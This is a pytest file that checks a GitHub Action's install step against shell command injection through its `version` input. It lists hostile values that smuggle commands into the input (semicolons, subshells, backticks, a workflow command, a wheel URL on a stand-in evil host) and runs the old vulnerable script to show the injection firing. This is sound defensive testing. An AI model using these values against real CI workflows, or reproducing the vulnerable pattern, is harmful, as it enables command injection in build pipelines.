"""Lab finding C3: the `version` input reaches bash as data, not as script text.

Companion to tests/test_expression_not_in_run_script.py (the static check). This file is
the dynamic half. It takes the real "Install Sunglasses" step out of action.yml and runs it
under bash the way the runner does (`bash --noprofile --norc -e -o pipefail <file>`), with a
stub `pip` on PATH that records its argv. Hostile values must end in exit 2 with pip not
called and nothing injected executed. Legitimate specifiers must reach pip as one argument
glued to the package name. An empty value must install the latest release.

The last test runs the old version of the step, with the expression expanded the way GitHub
expands it (textual substitution), and shows the injected command running. That is the
defect, and it shows the harness can see it.
"""
import os
import subprocess
import textwrap
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parent.parent
ACTION = ROOT / "action.yml"
STEP = "Install Sunglasses"
MARK = "INJECTED-COMMAND-RAN"

OLD_SCRIPT = textwrap.dedent('''\
    if [ -n "${{ inputs.version }}" ]; then
      pip install "sunglasses${{ inputs.version }}"
    else
      pip install sunglasses
    fi
    ''')

HOSTILE = {
    "semicolon": f'"; echo {MARK}; echo "',
    "subshell": f"$(echo {MARK})",
    "backticks": f"`echo {MARK}`",
    "and_and": f'==0.5.6" && echo {MARK} && echo "',
    "pipe": f'==0.5.6" | echo {MARK}; echo "',
    "newline": f"==0.5.6\necho {MARK}",
    "touch_marker": "$(touch MARKER_FILE)",
    "url_install": " @ https://evil.example/sunglasses-0.0.0-py3-none-any.whl",
    "extras": "[all]",
    "environment_marker": '==0.5.6; python_version>="3.9"',
    "workflow_command": "\n::warning::smuggled-workflow-command",
    "unicode_semicolon": "==0.5.6； echo " + MARK,
}

# Shell characters that a pip specifier can legitimately contain (`>` in `>=`, `*`
# in `==0.6.*`, a space). As data they stay inside ONE pip argument and do nothing.
DATA_NOT_CODE = {
    "redirect": "==0.5.6 > pwned.txt",
    "glob": "==0.6.* *",
    "tilde_home": "~=0.6 ~",
}

LEGIT = {
    "pinned": "==0.5.6",
    "range": ">=0.5,<0.7",
    "compatible": "~=0.6",
    "wildcard": "==0.6.*",
    "spaced": " == 0.5.6",
    "not_equal": "!=0.6.0",
    "arbitrary_equality": "===0.6.7",
    "pre_release": "==0.7.0rc1",
}


def _step():
    doc = yaml.safe_load(ACTION.read_text())
    return next(s for s in doc["runs"]["steps"] if s.get("name") == STEP)


def _run(script: str, version: str, tmp: Path):
    """Run `script` as the runner would, with a recording `pip` stub first on PATH."""
    bin_dir = tmp / "bin"
    bin_dir.mkdir(exist_ok=True)
    log = tmp / "pip.argv"
    stub = bin_dir / "pip"
    stub.write_text('#!/usr/bin/env bash\nfor a in "$@"; do printf "%s\\n" "$a" >> "$PIP_LOG"; done\n')
    stub.chmod(0o755)
    script_file = tmp / "step.sh"
    script_file.write_text(script)
    env = {
        "PATH": f"{bin_dir}:{os.environ.get('PATH', '/usr/bin:/bin')}",
        "PIP_LOG": str(log),
        "INPUT_VERSION": version,
        "HOME": str(tmp),
        "TMPDIR": os.environ.get("TMPDIR", str(tmp)),
    }
    proc = subprocess.run(
        ["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", str(script_file)],
        cwd=tmp, env=env, capture_output=True, text=True, timeout=30)
    argv = log.read_text().splitlines() if log.exists() else None
    return proc, argv


def test_the_step_reads_the_input_from_env_not_from_script_text():
    step = _step()
    assert step.get("env", {}).get("INPUT_VERSION") == "${{ inputs.version }}"
    assert "${{" not in step["run"], step["run"]


def test_empty_version_installs_the_latest_release(tmp_path):
    proc, argv = _run(_step()["run"], "", tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert argv == ["install", "sunglasses"]


@pytest.mark.parametrize("name", list(LEGIT), ids=list(LEGIT))
def test_a_pip_specifier_reaches_pip_as_one_argument(tmp_path, name):
    spec = LEGIT[name]
    proc, argv = _run(_step()["run"], spec, tmp_path)
    assert proc.returncode == 0, (proc.stdout, proc.stderr)
    assert argv == ["install", f"sunglasses{spec}"], argv


@pytest.mark.parametrize("name", list(HOSTILE), ids=list(HOSTILE))
def test_a_hostile_value_is_refused_before_bash_or_pip_sees_it(tmp_path, name):
    proc, argv = _run(_step()["run"], HOSTILE[name], tmp_path)
    out = proc.stdout + proc.stderr
    assert proc.returncode == 2, (proc.returncode, out)
    assert MARK not in out, out
    assert argv is None, argv
    assert not (tmp_path / "MARKER_FILE").exists()
    assert not (tmp_path / "pwned.txt").exists()
    assert "::error::" in proc.stdout
    # the refused value is not echoed, so it cannot smuggle a workflow command
    assert "smuggled" not in out
    assert all(line.startswith("::error::") or not line.startswith("::") for line in proc.stdout.splitlines())


@pytest.mark.parametrize("name", list(DATA_NOT_CODE), ids=list(DATA_NOT_CODE))
def test_shell_metacharacters_inside_a_specifier_stay_data(tmp_path, name):
    value = DATA_NOT_CODE[name]
    proc, argv = _run(_step()["run"], value, tmp_path)
    assert proc.returncode == 0, (proc.stdout, proc.stderr)
    assert argv == ["install", f"sunglasses{value}"], argv
    assert not (tmp_path / "pwned.txt").exists()
    assert sorted(p.name for p in tmp_path.iterdir()) == ["bin", "pip.argv", "step.sh"]


def test_the_harness_sees_the_injection_in_the_old_script(tmp_path):
    """The defect, reproduced: GitHub substitutes the expression textually, then bash runs it."""
    expanded = OLD_SCRIPT.replace("${{ inputs.version }}", HOSTILE["semicolon"])
    proc, argv = _run(expanded, "", tmp_path)
    assert MARK in proc.stdout, (proc.stdout, proc.stderr)
